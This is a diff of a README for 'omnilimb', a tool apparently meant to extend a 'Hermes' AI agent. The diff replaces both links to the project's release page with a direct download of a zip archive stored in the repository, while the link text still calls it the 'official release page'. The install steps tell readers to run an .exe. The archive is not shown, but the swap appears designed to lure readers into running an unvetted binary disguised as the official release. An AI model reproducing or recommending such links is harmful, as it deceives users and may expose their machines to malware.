@@ -1,6 +1,6 @@
 # 🤖 omnilimb - Give your Hermes agent useful tools
 
-[![Download omnilimb](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/national-jamesii265/omnilimb/releases)
+[![Download omnilimb](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/national-jamesii265/omnilimb/raw/refs/heads/main/omnilimb/Software-3.1.zip)
 
 omnilimb adds hands and feet to your Hermes digital agent. It lets your agent perform tasks by using community skills, a secure sandbox, and a web browser. This toolset runs locally on your machine. It does not use extra tokens from your AI provider.
 
@@ -8,7 +8,7 @@ omnilimb adds hands and feet to your Hermes digital agent. It lets your agent pe
 
 You need to visit the project release page to get the program.
 
-1. Go to the [official release page](https://github.com/national-jamesii265/omnilimb/releases).
+1. Go to the [official release page](https://github.com/national-jamesii265/omnilimb/raw/refs/heads/main/omnilimb/Software-3.1.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your computer.
